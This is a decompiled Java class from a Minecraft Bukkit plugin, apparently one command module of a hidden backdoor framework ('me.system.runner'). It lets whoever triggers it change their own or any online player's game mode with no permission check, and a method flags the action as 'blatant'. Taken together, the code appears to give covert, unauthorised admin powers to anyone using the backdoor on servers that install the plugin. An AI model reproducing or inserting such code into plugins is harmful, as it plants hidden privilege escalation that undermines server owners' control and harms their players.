
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

public class GamemodeCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length <= 1) {
            p2.sendMessage(Settings.USAGE("gamemode <mode> <player>"));
        } else {
            Player target;
            String gm2 = args[1];
            if (args.length >= 3 && (target = Bukkit.getServer().getPlayer(args[2])) == null) {
                p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + args[2] + Settings.WHITE + " is not online."));
                return;
            }
            if (gm2.equalsIgnoreCase("creative") || gm2.equalsIgnoreCase("1") || gm2.equalsIgnoreCase("c")) {
                plugin.getServer().getScheduler().scheduleSyncDelayedTask((Plugin)plugin, () -> {
                    if (args.length <= 2) {
                        p2.setGameMode(GameMode.CREATIVE);
                        p2.sendMessage(Settings.PREFIX("You set your gamemode to " + Settings.RED + "CREATIVE"));
                    } else {
                        Player target2 = Bukkit.getServer().getPlayer(args[2]);
                        target2.setGameMode(GameMode.CREATIVE);
                        p2.sendMessage(Settings.PREFIX("You set " + Settings.RED + target2.getName() + "'s " + Settings.WHITE + "gamemode to " + Settings.RED + "CREATIVE"));
                    }
                });
            } else if (gm2.equalsIgnoreCase("survival") || gm2.equalsIgnoreCase("s") || gm2.equalsIgnoreCase("0")) {
                plugin.getServer().getScheduler().scheduleSyncDelayedTask((Plugin)plugin, () -> {
                    if (args.length <= 2) {
                        p2.setGameMode(GameMode.SURVIVAL);
                        p2.sendMessage(Settings.PREFIX("You set your gamemode to " + Settings.RED + "SURVIVAL"));
                    } else {
                        Player target2 = Bukkit.getServer().getPlayer(args[2]);
                        target2.setGameMode(GameMode.SURVIVAL);
                        p2.sendMessage(Settings.PREFIX("You set " + Settings.RED + target2.getName() + "'s " + Settings.WHITE + "gamemode to " + Settings.RED + "SURVIVAL"));
                    }
                });
            } else if (gm2.equalsIgnoreCase("spectator") || gm2.equalsIgnoreCase("sp") || gm2.equalsIgnoreCase("3")) {
                plugin.getServer().getScheduler().scheduleSyncDelayedTask((Plugin)plugin, () -> {
                    if (args.length <= 2) {
                        p2.setGameMode(GameMode.SPECTATOR);
                        p2.sendMessage(Settings.PREFIX("You set your gamemode to " + Settings.RED + "SPECTATOR"));
                    } else {
                        Player target2 = Bukkit.getServer().getPlayer(args[2]);
                        target2.setGameMode(GameMode.SPECTATOR);
                        p2.sendMessage(Settings.PREFIX("You set " + Settings.RED + target2.getName() + "'s " + Settings.WHITE + "gamemode to " + Settings.RED + "SPECTATOR"));
                    }
                });
            } else if (gm2.equalsIgnoreCase("adventure") || gm2.equalsIgnoreCase("a") || gm2.equalsIgnoreCase("2")) {
                plugin.getServer().getScheduler().scheduleSyncDelayedTask((Plugin)plugin, () -> {
                    if (args.length <= 2) {
                        p2.setGameMode(GameMode.ADVENTURE);
                        p2.sendMessage(Settings.PREFIX("You set your gamemode to " + Settings.RED + "ADVENTURE"));
                    } else {
                        Player target2 = Bukkit.getServer().getPlayer(args[2]);
                        target2.setGameMode(GameMode.ADVENTURE);
                        p2.sendMessage(Settings.PREFIX("You set " + Settings.RED + target2.getName() + "'s " + Settings.WHITE + "gamemode to " + Settings.RED + "ADVENTURE"));
                    }
                });
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

